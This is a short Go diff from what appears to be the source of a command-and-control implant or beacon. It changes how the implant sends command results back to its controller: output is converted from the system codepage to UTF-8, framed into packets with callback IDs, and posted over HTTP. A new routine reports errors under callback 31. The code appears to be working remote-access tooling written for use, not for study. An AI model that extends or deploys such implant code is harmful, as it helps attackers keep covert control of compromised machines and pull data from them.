@@ -5,14 +5,13 @@ import (
 	"crypto/sha256"
 	"encoding/binary"
 	"fmt"
+	"github.com/imroc/req"
 	"main/config"
 	"main/sysinfo"
 	"main/util"
 	"strconv"
 	"strings"
 	"time"
-
-	"github.com/imroc/req"
 )
 
 var (
@@ -299,7 +298,21 @@ func PullCommand() ([]byte, error) {
 	return resp, nil
 }
 
-func PushResult(b []byte) *req.Resp {
-	resp := HttpPost(b)
+func PushResult(callBack int, b []byte) *req.Resp {
+	utf8bytes, err := codepageToUTF8(b)
+	if err != nil {
+		ErrorMessage(err.Error())
+	}
+	finalPacket := MakePacket(callBack, utf8bytes)
+	resp := HttpPost(finalPacket)
 	return resp
+}
+
+func ErrorMessage(err string) {
+	errIdBytes := WriteInt(0) // must be zero
+	arg1Bytes := WriteInt(0)  // for debug
+	arg2Bytes := WriteInt(0)
+	errMsgBytes := []byte(err)
+	result := util.BytesCombine(errIdBytes, arg1Bytes, arg2Bytes, errMsgBytes)
+	PushResult(31, result)
 }
